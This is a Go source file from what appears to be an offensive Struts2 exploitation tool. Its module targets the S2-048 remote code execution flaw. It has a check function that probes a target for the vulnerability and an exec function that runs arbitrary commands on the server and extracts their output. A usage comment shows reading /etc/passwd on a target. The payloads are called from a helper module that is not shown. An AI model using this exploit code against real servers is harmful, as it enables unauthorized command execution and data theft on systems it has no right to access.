package s048

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
	"net/url"
	"strings"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-048/integration/saveGangster.action --vn 48 --mode exec --cmd "cat /etc/passwd" --data "name=fuckit&age=aaa&__checkbox_bustedBefore=true&description=aaa"
*/

func Check(targetUrl string, postData string) {
	respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS048Check)
	if utils.IfContainsStr(respString, "6308") {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-048！"))
	} else {
		log.Printf("%s Struts2-048 Not Vulnerable.", utils.Green(targetUrl))
	}
}

func ExecCommand(targetUrl string, command string, postData string) {
	respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS048Exec(command))
	respString = strings.Replace(url.QueryEscape(respString), "%00", "", -1)
	execResult := utils.GetBetweenStr(respString, "s048execstart", "s048execend")
	fmt.Println(url.QueryUnescape(execResult))
}
